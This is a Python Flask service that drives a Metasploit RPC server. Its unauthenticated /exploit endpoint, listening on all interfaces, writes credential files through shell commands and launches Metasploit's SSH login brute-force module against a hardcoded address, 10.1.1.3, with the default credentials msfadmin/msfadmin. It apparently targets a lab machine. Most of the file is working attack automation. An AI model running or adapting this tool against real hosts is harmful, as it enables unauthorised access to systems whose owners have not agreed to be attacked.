import subprocess
from flask import Flask, jsonify, request
from pymetasploit3.msfrpc import MsfRpcClient
import os

app = Flask(__name__)

MSF_SERVER = os.getenv("MSF_HOST", "127.0.0.1")
MSF_PORT = os.getenv("MSF_PORT", 55553)
ESHU_PORT = int(os.getenv("ESHU_PORT", 5000))

# Load Metasploit server configuration from environment variables
print(f"[-] Attempting to connect to MSF at {MSF_SERVER}:{MSF_PORT}")
while True:  # Just keep attempting to load if it's not started yet
    try: 
        client = MsfRpcClient(
            os.getenv("MSF_PASSWORD"),
            server=MSF_SERVER,
            port=int(MSF_PORT)
        )
        # Success! Break out
        break
    except:
        print("[!] Failed. Trying again...")
        pass

print(f"[+] Successfully connected to MSF Server!")

@app.route('/sessions', methods=['GET'])
def list_sessions():
    """List all active sessions."""
    sessions = client.sessions.list
    return jsonify(sessions)

@app.route('/exploit', methods=['POST'])
def run_exploit():
    """Run SSH brute force using hardcoded auxiliary module and options."""
    try:
        # Create user_file.txt and pass_file.txt in /home directory
        subprocess.run('echo "msfadmin" > /home/user_file.txt', shell=True, check=True)
        subprocess.run('echo "msfadmin" > /home/pass_file.txt', shell=True, check=True)
        print("[Debug] Created user_file.txt and pass_file.txt with default credentials.")

        # Load the auxiliary SSH login module
        module = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        print("[Debug] Loaded auxiliary module 'scanner/ssh/ssh_login'.")

        # Print module options for debugging
        print("[Debug] Module options structure:", module.options)

        # Set all required options for the brute force exploit
        module['RHOSTS'] = "10.1.1.3"
        module['USER_FILE'] = "/home/user_file.txt"
        module['PASS_FILE'] = "/home/pass_file.txt"
        module['USERNAME'] = "msfadmin"
        module['PASSWORD'] = "msfadmin"
        print("[Debug] Set all module options for brute force.")

        # Execute module
        result = module.execute()
        print("[Debug] Module executed with result:", result)

        # Return the result of the execution
        return jsonify({"status": "module executed successfully", "result": result})

    except Exception as e:
        print(f"[Error during execution] {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=ESHU_PORT)
